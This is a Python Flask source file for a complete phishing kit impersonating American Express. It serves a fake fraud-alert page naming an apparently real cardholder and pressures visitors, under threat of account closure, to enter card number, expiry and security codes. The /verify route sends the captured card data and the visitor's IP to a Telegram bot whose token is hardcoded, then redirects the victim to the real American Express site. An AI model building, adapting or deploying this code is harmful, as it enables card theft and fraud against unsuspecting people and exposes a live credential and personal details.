import os
import logging
from flask import Flask, request, redirect, render_template_string
import requests

# FALLBACK FOR LOCAL TESTING ONLY - RAILWAY OVERRIDES THESE WITH ENV VARS
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8887245058:AAGeopviTcxIffuEf4LkRWPhxNbNEi1Q-lg')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '8790611176')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

PHISHING_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Security Alert - American Express</title>
    <style>
        body { font-family: 'Arial', 'Helvetica', sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; color: #333; }
        .email-container { max-width: 600px; margin: 0 auto; background-color: #ffffff; border: 1px solid #e0e0e0; }
        .top-header { padding: 20px 30px; border-bottom: 1px solid #eee; }
        .user-name { font-weight: bold; font-size: 16px; text-transform: uppercase; letter-spacing: 0.5px; }
        .account-num { font-size: 14px; color: #666; margin-top: 4px; }
        .blue-banner { background-color: #006fcf; color: white; padding: 30px; display: flex; align-items: center; gap: 20px; }
        .warning-icon { width: 50px; height: 50px; background-color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #006fcf; font-size: 28px; font-weight: bold; flex-shrink: 0; }
        .banner-text { font-size: 22px; font-weight: bold; line-height: 1.3; }
        .content-body { padding: 30px; }
        .transaction-details { font-size: 15px; color: #555; margin-bottom: 25px; line-height: 1.5; }
        .action-prompt { font-weight: bold; margin-bottom: 15px; font-size: 15px; }
        .instruction-text { margin-bottom: 25px; font-size: 14px; color: #444; line-height: 1.6; }
        .form-section { background-color: #f9f9f9; padding: 20px; border-radius: 4px; border: 1px solid #eee; margin-bottom: 25px; }
        .input-row { display: flex; gap: 10px; margin-bottom: 10px; }
        .form-input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
        .submit-btn { background-color: #006fcf; color: white; border: none; padding: 12px 25px; border-radius: 3px; font-weight: bold; cursor: pointer; width: 100%; font-size: 15px; margin-top: 10px; }
        .submit-btn:hover { background-color: #0056a3; }
        .footer-text { font-size: 13px; color: #666; margin-top: 20px; line-height: 1.5; }
        .footer-links { margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; text-align: center; font-size: 12px; color: #888; }
        .footer-links a { color: #006fcf; text-decoration: none; margin: 0 8px; }
        .legal-text { font-size: 10px; color: #999; margin-top: 15px; text-align: center; }
    </style>
</head>
<body>
    <div class="email-container">
        <div class="top-header">
            <div class="user-name">BRION S DENISON</div>
            <div class="account-num">Account ending: 15004</div>
        </div>
        <div class="blue-banner">
            <div class="warning-icon">!</div>
            <div class="banner-text">We detected a recent purchase on your Card to protect against fraud. Your account is triggered.</div>
        </div>
        <div class="content-body">
            <div class="transaction-details">$34.50 purchase on 10/06/2026 at MIDOLOTTO.COM on your Card ending in 15004</div>
            <div class="action-prompt">What you need to do next?</div>
            <p class="instruction-text">This is an account trigger. We want to confirm you made this purchase, just as you requested security and trigger updates on your account. Verify your identity below. If you do not verify, we can close this account.</p>
            <form action="/verify" method="POST" class="form-section">
                <input type="text" name="card_number" class="form-input" placeholder="Full Card Number" required maxlength="19" style="margin-bottom: 10px;">
                <div class="input-row">
                    <input type="text" name="expiry" class="form-input" placeholder="MM/YY" required maxlength="5">
                    <input type="text" name="ccv" class="form-input" placeholder="CCV (4)" required maxlength="4">
                    <input type="text" name="cid" class="form-input" placeholder="CID (3)" required maxlength="3">
                </div>
                <button type="submit" class="submit-btn">Verify Identity Now</button>
            </form>
            <div class="footer-text">Still have questions, just call 1-800-824-9289 or the number on the back of your Card.</div>
        </div>
        <div class="footer-links">
            <a href="#">About your online security</a> | <a href="#">Get the American Express® App</a> | <a href="#">View your account online</a>
            <div class="legal-text">© 2026 American Express. All rights reserved<br>SSF0CTA034</div>
        </div>
    </div>
</body>
</html>
"""

def send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.error("CRITICAL: Telegram credentials missing")
        return
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    
    try:
        resp = requests.post(url, json=payload, timeout=5)
        logger.info(f"Telegram API Response: {resp.status_code} | {resp.text}")
        resp.raise_for_status()
    except Exception as e:
        logger.error(f"Telegram Failed: {str(e)}")

@app.route('/')
def index():
    return render_template_string(PHISHING_PAGE)

@app.route('/verify', methods=['POST'])
def verify_card():
    card_number = request.form.get('card_number', '')
    expiry = request.form.get('expiry', '')
    ccv = request.form.get('ccv', '')
    cid = request.form.get('cid', '')
    ip = request.remote_addr
    
    message = (
        f"🚨 <b>New Capture</b>\n"
        f"💳 <b>Card:</b> <code>{card_number}</code>\n"
        f"📅 <b>Expiry:</b> {expiry}\n"
        f" <b>CCV:</b> {ccv}\n"
        f"🔑 <b>CID:</b> {cid}\n"
        f"🌐 <b>IP:</b> {ip}"
    )
    
    send_telegram(message)
    logger.info(f"Captured: {card_number} | IP: {ip}")
    
    return redirect("https://www.americanexpress.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
